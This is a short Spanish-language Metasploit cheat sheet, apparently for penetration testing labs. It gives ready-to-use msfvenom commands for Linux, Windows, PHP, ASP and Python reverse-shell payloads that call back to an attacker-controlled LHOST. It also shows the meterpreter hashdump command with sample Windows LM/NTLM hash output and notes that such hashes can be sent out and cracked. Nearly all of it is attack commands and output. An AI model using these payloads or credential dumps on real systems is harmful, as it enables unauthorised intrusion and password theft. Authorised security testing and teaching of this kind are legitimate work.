# Cheat Sheet Metasploit
Metasploit es un proyecto de código abierto para la seguridad informática, que proporciona información acerca de vulnerabilidades de seguridad y ayuda en tests de penetración "Pentesting" y el desarrollo de firmas para sistemas de detección de intrusos.

### Cargas Útiles
Según la configuración del sistema de destino (sistema operativo, servidor web instalado, instalador intérprete, etc.), msfvenom se puede usar para crear cargas útiles en casi todos los formatos. A continuación hay algunos ejemplos que usará a menudo:
En todos estos ejemplos, LHOST será la dirección IP de su máquina atacante y LPORT será el puerto en el que escuchará su controlador.

LA

**Linux Shell**
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
```
chmod +x shell.elf
```
**Windows Shell**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```
**PHP Shell**
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
**ASP Shell**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```
**Python Shell**
```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

### Dump Password Windows
Las contraseñas de Windows 10 almacenadas como hashes NTLM se pueden volcar y filtrar al sistema de un atacante en segundos. Los hashes se pueden forzar bruscamente y descifrar muy fácilmente para revelar las contraseñas en texto sin formato utilizando una combinación de herramientas, incluidas Mimikatz, ProcDump, John the Ripper y Hashcat.
**Dump Hash**
```
hashdump
```
```
Administrator:500:CEEB0FA9F240C200417EAF40CFAC29C3:D280553F0103F2E643406517296E7582:::
User1:1011:7584248B8D2C9F9EAAD3B435B51404EE:186CB09181E2C2ECAAC768C47C729904:::
User2:1012:AC5BA6A944526699AAD3B435B51404EE:F07A9DFFFC2C5C7F9D9EBC83FD69D68E:::
User3:1013:E7EED3F5C2C85B88AAD3B435B51404EE:6AA15B3D14492D3FA4AA7C5E9CDC0E6A:::

1 Campo: nombre de usuario (Administrador, Usuario1, etc.)
2 Campo: Identificación Relativa (RID): últimos 3-4 dígitos del Identificador de Seguridad (SID),que son únicos para cada usuario
3 Campo: hash LM
4 Campo: hash NTLM
```
